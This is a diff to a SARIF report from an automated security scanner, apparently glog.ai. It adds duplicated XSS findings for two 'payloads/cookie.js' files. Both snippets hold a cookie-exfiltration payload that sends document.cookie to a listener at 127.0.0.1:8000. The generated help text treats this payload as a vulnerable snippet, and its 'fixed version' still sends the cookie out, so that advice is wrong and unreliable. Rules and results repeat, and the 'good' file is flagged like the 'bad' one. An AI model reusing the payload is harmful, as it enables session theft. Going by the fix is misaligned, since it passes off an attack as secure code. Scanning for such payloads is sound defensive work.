@@ -10,7 +10,96 @@
           "version": "1.0.0",
           "semanticVersion": "1.0.0",
           "informationUri": "https://www.glog.ai",
-          "rules": [],
+          "rules": [
+            {
+              "id": "bf1be167-8506-3297-8bf9-f8b9ec2b12d4",
+              "name": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\"",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nCross-Site Scripting (XSS) vulnerabilities occur when data enters a program from an untrusted source and is used to generate dynamic HTML content. The vulnerability in the provided JavaScript code snippet is a potential XSS vulnerability because it uses user-controlled data (in this case, a cookie) to construct a URL for an image source. An attacker could manipulate the cookie to inject malicious scripts, which would then be executed when the image source URL is processed.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should always encode user-controlled data before using it to generate HTML content. This can be done using JavaScript's built-in encoding functions or by using a trusted library that provides secure encoding functions. Additionally, you should use HTTP-only cookies to prevent JavaScript from accessing sensitive cookies.\n\n## Source Code Fix\n\nHere is a fixed version of the provided code snippet:\n\n```javascript\nnew Image().src = 'http://127.0.0.1:8000/cookie?c=' + encodeURIComponent(document.cookie);\n```\n\nIn this fixed version, the `encodeURIComponent` function is used to securely encode the cookie before it is used to construct the image source URL.\n\n## Library Dependencies\n\nThe provided code snippet does not require any library dependencies to execute properly. It uses only built-in JavaScript functions and properties.\n\n## OWASP and CWE Resources\n\n- [OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)\n- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-79",
+                    "url": "https://cwe.mitre.org/data/definitions/79.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-79"
+                ]
+              }
+            },
+            {
+              "id": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
+              "name": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\"",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nCross-Site Scripting (XSS) vulnerabilities occur when data enters a program from an untrusted source and is used to generate dynamic HTML content. The vulnerability in the provided JavaScript code snippet is a potential XSS vulnerability because it uses user-controlled data (in this case, a cookie) to construct a URL for an image source. An attacker could manipulate the cookie to inject malicious scripts, which would then be executed when the image source URL is processed.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should always encode user-controlled data before using it to generate HTML content. This can be done using JavaScript's built-in encoding functions or by using a trusted library that provides secure encoding functions. Additionally, you should use HTTP-only cookies to prevent JavaScript from accessing sensitive cookies.\n\n## Source Code Fix\n\nHere is a fixed version of the provided code snippet:\n\n```javascript\nnew Image().src = 'http://127.0.0.1:8000/cookie?c=' + encodeURIComponent(document.cookie);\n```\n\nIn this fixed version, the `encodeURIComponent` function is used to securely encode the cookie before it is used to construct the image source URL.\n\n## Library Dependencies\n\nThe provided code snippet does not require any library dependencies to execute properly. It uses only built-in JavaScript functions and properties.\n\n## OWASP and CWE Resources\n\n- [OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)\n- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-79",
+                    "url": "https://cwe.mitre.org/data/definitions/79.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-79"
+                ]
+              }
+            },
+            {
+              "id": "bf1be167-8506-3297-8bf9-f8b9ec2b12d4",
+              "name": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\"",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nCross-Site Scripting (XSS) vulnerabilities occur when data enters a program from an untrusted source and is used to generate dynamic HTML content. The vulnerability in the provided JavaScript code snippet is a potential XSS vulnerability because it uses user-controlled data (in this case, a cookie) to construct a URL for an image source. An attacker could manipulate the cookie to inject malicious scripts, which would then be executed when the image source URL is processed.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should always encode user-controlled data before using it to generate HTML content. This can be done using JavaScript's built-in encoding functions or by using a trusted library that provides secure encoding functions. Additionally, you should use HTTP-only cookies to prevent JavaScript from accessing sensitive cookies.\n\n## Source Code Fix\n\nHere is a fixed version of the provided code snippet:\n\n```javascript\nnew Image().src = 'http://127.0.0.1:8000/cookie?c=' + encodeURIComponent(document.cookie);\n```\n\nIn this fixed version, the `encodeURIComponent` function is used to securely encode the cookie before it is used to construct the image source URL.\n\n## Library Dependencies\n\nThe provided code snippet does not require any library dependencies to execute properly. It uses only built-in JavaScript functions and properties.\n\n## OWASP and CWE Resources\n\n- [OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)\n- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-79",
+                    "url": "https://cwe.mitre.org/data/definitions/79.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-79"
+                ]
+              }
+            },
+            {
+              "id": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
+              "name": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\"",
+              "helpUri": "https://www.glog.ai/",
+              "help": {
+                "text": "",
+                "markdown": "## Description\n\nCross-Site Scripting (XSS) vulnerabilities occur when data enters a program from an untrusted source and is used to generate dynamic HTML content. The vulnerability in the provided JavaScript code snippet is a potential XSS vulnerability because it uses user-controlled data (in this case, a cookie) to construct a URL for an image source. An attacker could manipulate the cookie to inject malicious scripts, which would then be executed when the image source URL is processed.\n\n## Mitigation Advice\n\nTo mitigate this vulnerability, you should always encode user-controlled data before using it to generate HTML content. This can be done using JavaScript's built-in encoding functions or by using a trusted library that provides secure encoding functions. Additionally, you should use HTTP-only cookies to prevent JavaScript from accessing sensitive cookies.\n\n## Source Code Fix\n\nHere is a fixed version of the provided code snippet:\n\n```javascript\nnew Image().src = 'http://127.0.0.1:8000/cookie?c=' + encodeURIComponent(document.cookie);\n```\n\nIn this fixed version, the `encodeURIComponent` function is used to securely encode the cookie before it is used to construct the image source URL.\n\n## Library Dependencies\n\nThe provided code snippet does not require any library dependencies to execute properly. It uses only built-in JavaScript functions and properties.\n\n## OWASP and CWE Resources\n\n- [OWASP XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)\n- [CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)"
+              },
+              "properties": {
+                "cwe": [
+                  {
+                    "id": "CWE-79",
+                    "url": "https://cwe.mitre.org/data/definitions/79.html"
+                  }
+                ],
+                "severity": "MEDIUM",
+                "kind": "FAIL",
+                "tags": [
+                  "CWE-79"
+                ]
+              }
+            }
+          ],
           "language": "en-US",
           "contents": [
             "localizedData",
@@ -20,7 +109,148 @@
         }
       },
       "language": "en-US",
-      "results": [],
+      "results": [
+        {
+          "ruleId": "bf1be167-8506-3297-8bf9-f8b9ec2b12d4",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/payloads/cookie.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 1,
+                  "startColumn": 1,
+                  "endLine": 1,
+                  "endColumn": 69,
+                  "snippet": {
+                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "2fc432c7106e71489c37dd38fdc61e4a181b2c095e6e0e86cbdde077b0e927e5",
+            "glog-pfp-ruleFileCode/v1": "67fdccd1b8f4a69c9eb296519572eb61051264f9375a4086a4f48a7fabec7caf"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "67fdccd1b8f4a69c9eb296519572eb61051264f9375a4086a4f48a7fabec7caf"
+          }
+        },
+        {
+          "ruleId": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/payloads/cookie.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 1,
+                  "startColumn": 1,
+                  "endLine": 1,
+                  "endColumn": 69,
+                  "snippet": {
+                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "72c4fdb4adcbb0bca23e0184bc19f1032cac40e9aec47ca4bc5750815b4cac0f",
+            "glog-pfp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
+          }
+        },
+        {
+          "ruleId": "bf1be167-8506-3297-8bf9-f8b9ec2b12d4",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "bad/payloads/cookie.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 1,
+                  "startColumn": 1,
+                  "endLine": 1,
+                  "endColumn": 69,
+                  "snippet": {
+                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "2fc432c7106e71489c37dd38fdc61e4a181b2c095e6e0e86cbdde077b0e927e5",
+            "glog-pfp-ruleFileCode/v1": "67fdccd1b8f4a69c9eb296519572eb61051264f9375a4086a4f48a7fabec7caf"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "67fdccd1b8f4a69c9eb296519572eb61051264f9375a4086a4f48a7fabec7caf"
+          }
+        },
+        {
+          "ruleId": "dc4a0e19-fe3b-3387-b751-5b7d7cfb0cda",
+          "kind": "fail",
+          "level": "warning",
+          "message": {
+            "text": "\"Potential XSS Vulnerability from User-Controlled Data in HTML String\""
+          },
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "good/payloads/cookie.js",
+                  "uriBaseId": "%SRCROOT%"
+                },
+                "region": {
+                  "startLine": 1,
+                  "startColumn": 1,
+                  "endLine": 1,
+                  "endColumn": 69,
+                  "snippet": {
+                    "text": "new Image().src = 'http://127.0.0.1:8000/cookie?c='+document.cookie;"
+                  },
+                  "sourceLanguage": "javascript"
+                }
+              }
+            }
+          ],
+          "partialFingerprints": {
+            "glog-pfp-ruleFileLineCode/v1": "72c4fdb4adcbb0bca23e0184bc19f1032cac40e9aec47ca4bc5750815b4cac0f",
+            "glog-pfp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
+          },
+          "fingerprints": {
+            "glog-fp-ruleFileCode/v1": "62ef702b1b8fb40663e9a4aa167949e3319fe57f25542c00223a317c8717a161"
+          }
+        }
+      ],
       "newlineSequences": [
         "\r\n",
         "\n"
